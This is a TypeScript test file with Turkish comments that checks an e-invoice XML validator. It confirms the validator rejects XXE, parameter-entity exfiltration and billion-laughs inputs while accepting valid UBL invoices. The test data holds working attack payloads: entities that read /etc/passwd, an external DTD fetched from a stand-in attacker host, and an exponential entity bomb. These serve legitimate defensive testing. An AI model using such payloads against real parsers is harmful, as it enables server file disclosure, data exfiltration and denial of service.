import { describe, it, expect } from 'vitest'
import {
  validateXmlFile,
  mimeTuruUygunMu,
  ALLOWED_EXTENSIONS,
  MAX_XML_BYTES,
  FileValidationError
} from '../src/services/documentSecurity.js'

/*
 * XML KABUL KAPISI.
 *
 * Bu dosyanın varlık sebebi: XML, JSON gibi zararsız bir metin biçimi
 * DEĞİL. DTD üzerinden sunucunun dosyaları okunabilir (XXE) ya da
 * belleği tüketilebilir (varlık şişmesi). e-Fatura desteği XML kapısını
 * açtığı için bu iki saldırının reddedildiği KANITLANMALI -- "kütüphane
 * hallediyordur" bir kanıt değildir.
 */

const buf = (s: string) => Buffer.from(s, 'utf-8')

const GECERLI_FATURA = `<?xml version="1.0" encoding="UTF-8"?>
<Invoice xmlns="urn:oasis:names:specification:ubl:schema:xsd:Invoice-2">
  <ID>ABC2026000000123</ID>
  <IssueDate>2026-08-23</IssueDate>
</Invoice>`

describe('validateXmlFile — XXE (dış varlık)', () => {
  /*
   * Klasik XXE. Ayrıştırıcı dış varlığı çözerse sunucudaki dosya
   * faturanın içine gömülür ve kullanıcıya geri gösterilir.
   */
  it('dış varlık bildiren XML reddedilir', () => {
    const saldiri = `<?xml version="1.0"?>
<!DOCTYPE fatura [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Invoice><ID>&xxe;</ID></Invoice>`
    expect(() => validateXmlFile(buf(saldiri))).toThrow(FileValidationError)
  })

  it('parametre varlığı ile dışarı sızdırma denemesi de reddedilir', () => {
    const saldiri = `<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % dis SYSTEM "http://saldirgan.example/kotu.dtd">
  %dis;
]>
<r/>`
    expect(() => validateXmlFile(buf(saldiri))).toThrow(FileValidationError)
  })

  /*
   * DOCTYPE'ı yorum içine saklayıp kontrolü atlatma denemesi. Kontrol
   * yorumları ÖNCE siliyor, bu yüzden gizlenen bildirim de yakalanır.
   */
  it('yorumla gizlenmiş DOCTYPE atlatamaz', () => {
    const saldiri = `<?xml version="1.0"?>
<!-- zararsız görünsün -->
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<r>&x;</r>`
    expect(() => validateXmlFile(buf(saldiri))).toThrow(FileValidationError)
  })

  it('büyük-küçük harf değiştirerek atlatamaz', () => {
    const saldiri = `<?xml version="1.0"?>
<!dOcTyPe r [<!eNtItY x SYSTEM "file:///etc/passwd">]>
<r/>`
    expect(() => validateXmlFile(buf(saldiri))).toThrow(FileValidationError)
  })
})

describe('validateXmlFile — varlık şişmesi (milyar kahkaha)', () => {
  /*
   * Birkaç yüz baytlık bu dosya, varlıklar çözülürse gigabaytlara
   * açılır ve süreci öldürür. DTD reddi bunu kapıda durduruyor;
   * ayrıştırıcıya HİÇ ulaşmıyor.
   */
  it('iç içe varlık tanımlayan dosya ayrıştırılmadan reddedilir', () => {
    const saldiri = `<?xml version="1.0"?>
<!DOCTYPE lol [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lol>&lol4;</lol>`

    const basla = Date.now()
    expect(() => validateXmlFile(buf(saldiri))).toThrow(FileValidationError)
    /* Reddin ayrıştırma denemeden olduğunun kanıtı: anında dönmeli. */
    expect(Date.now() - basla).toBeLessThan(1000)
  })
})

describe('validateXmlFile — boyut ve içerik', () => {
  it('boş dosya reddedilir', () => {
    expect(() => validateXmlFile(Buffer.alloc(0))).toThrow(FileValidationError)
  })

  it('sınırı aşan dosya ayrıştırılmadan reddedilir', () => {
    const buyuk = buf('<r>' + 'a'.repeat(MAX_XML_BYTES + 1) + '</r>')
    expect(() => validateXmlFile(buyuk)).toThrow(/MB sınırını aşıyor/)
  })

  it('ikili içerik XML sayılmaz', () => {
    expect(() => validateXmlFile(Buffer.from([0x3c, 0x72, 0x00, 0x3e]))).toThrow(FileValidationError)
  })

  it('biçimi bozuk XML reddedilir', () => {
    expect(() => validateXmlFile(buf('<Invoice><ID>123</Invoice>'))).toThrow(/biçim hatalı/)
  })

  /*
   * En önemli olumlu durum: korumalar gerçek bir faturayı KIRMAMALI.
   * UBL-TR belgelerinde DTD bulunmaz, şema doğrulaması XSD ile yapılır.
   */
  it('DTD içermeyen geçerli UBL faturası kabul edilir', () => {
    expect(() => validateXmlFile(buf(GECERLI_FATURA))).not.toThrow()
  })

  it('yorum içeren ama DTD içermeyen fatura kabul edilir', () => {
    const yorumlu = `<?xml version="1.0"?>
<!-- Paraşüt tarafından üretildi -->
<Invoice><ID>X1</ID></Invoice>`
    expect(() => validateXmlFile(buf(yorumlu))).not.toThrow()
  })
})

describe('MIME ve uzantı kabulü', () => {
  it('xml uzantısı izin listesinde', () => {
    expect(ALLOWED_EXTENSIONS.has('xml')).toBe(true)
  })

  /* Muhasebe programları ikisini de gönderiyor; biri reddedilirse
     tamamen geçerli bir fatura 415 alırdı. */
  it('application/xml ve text/xml ikisi de kabul edilir', () => {
    expect(mimeTuruUygunMu('xml', 'application/xml')).toBe(true)
    expect(mimeTuruUygunMu('xml', 'text/xml')).toBe(true)
  })

  it('alakasız MIME türü kabul edilmez', () => {
    expect(mimeTuruUygunMu('xml', 'application/octet-stream')).toBe(false)
    expect(mimeTuruUygunMu('xml', 'text/html')).toBe(false)
  })

  /* Diğer türlerin davranışı değişmemeli. */
  it('mevcut türlerin kuralları korunuyor', () => {
    expect(mimeTuruUygunMu('pdf', 'application/pdf')).toBe(true)
    expect(mimeTuruUygunMu('pdf', 'text/xml')).toBe(false)
    expect(mimeTuruUygunMu('json', 'application/json')).toBe(true)
  })
})
